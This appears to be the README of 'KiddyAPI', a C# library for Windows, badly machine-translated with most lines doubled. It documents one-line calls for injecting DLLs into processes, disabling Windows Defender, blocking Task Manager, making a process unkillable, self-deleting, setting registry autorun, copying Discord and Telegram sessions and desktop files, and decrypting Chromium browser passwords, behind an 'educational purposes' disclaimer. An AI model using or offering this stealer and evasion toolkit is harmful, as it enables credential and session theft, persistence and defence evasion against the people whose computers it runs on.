# KiddyAPI --  Shitty translation, original credit @ Whiroo/KiddyAPI  <--
KiddyAPI created from "script kiddie" to "script kiddie". Library, to learn not very correct methods of working with Windows OS.

KiddyAPI is created from script-kiddies for script-kiddies. Library for learning not very correct methods of working with Windows.

Tested on Win7 x64. In the near future I will add more features.

Tested on Win7 x64. In the near future I will add more features.
## Disclaimer: / Denial of responsibility:
This library was written for educational purposes, the author is not responsible for the use for other purposes.

This library was written for educational purposes; the author is not responsible for use for other purposes.

Use only on your own computers or with the permission of the user

Use only on their computers or with the permission of the user
## Namespaces and methods / Namespaces and methods:
### Info:
Get active user window by title bar / Get the active user window by title :
``C#
CheckWindow.GetWindow("example");
``
Set new password on Windows / Set a new password on Windows:
``C#
SystemWork.ChangeWinPass("example");
``
Get external IP address / Get external IP address:
``C#
SystemWork.GetIP();
``
Get information about required modules / Get information about the required modules :
``C#
SystemWork.GetInfo(WinClass,ClassItem);
``
Get MAC address / Get MAC Address:
``C#
SystemWork.GetMacAddress();
``
Get screenshot / Get a screenshot of the screen:
``C#
SystemWork.GetScreen("C:\\example");
``
### Injector:
Injectin in the process C++ DLL / occured injecting into the C ++ DLL process:
``C#
Injector.Execute("pathToDLL", Process);
``
### Config:
Class for further developments, so far there is nothing in it wrote

Check under admin if launched :
``C#
if(Config.IsAdmin) { blablabla }
``
### Protect:
Disable Windows Defender - `DisableDefender.FirstRun();` - Used when the program is first started,
then use `DisableDefender.CheckDefender();` in a loop in order to check for any changes in the settings

Disable Windows Defender - `DisableDefender.FirstRun ();` - Used when first running the program,
then use `DisableDefender.CheckDefender ();` in an infinite loop to check if the parameters have changed

Close the program if some process is running / Close the program if some process is running. :
``C#
HideModule.CheckProcess("example");
``
Block/Unblock the task Manager / Lock / Unlock Task Manager :
``C#
HideModule.EnableTaskManager(true/false);
``
Self-Delete / SelfDelete :
``C#
HideModule.Suicide("pathToOwnExe");`
``
Add to startup( through the registry ) / Autorun:
``C#
HideModule.SetAutorun("the name that will appear in the registry", "pathToFile");
``
Make process impossible to kill in task Manager / Make the process impossible to kill in the Task Manager:
``C#
ProcessProtect.Protect();
``
### Steal :

Here we copy files from desktop/Discord session/Telegram session / Here we copy files from the desktop / Discord session / Telegram session:

General view such :
``C#
Apps.Desktop/Telegram/Discord/.Steal("pathToCopy", true/false("overwrite old files if already present");
``

Decrypt passwords from ChromiumBased browsers / Decrypt passwords from ChromiumBased browsers :
``C#
`Browsers.DecryptBrowsers(byte [] is "the password from the database",byte [] entropy);`
``
Grabber did not add, as it is already fat. Decrypt occurs through WinAPI function.
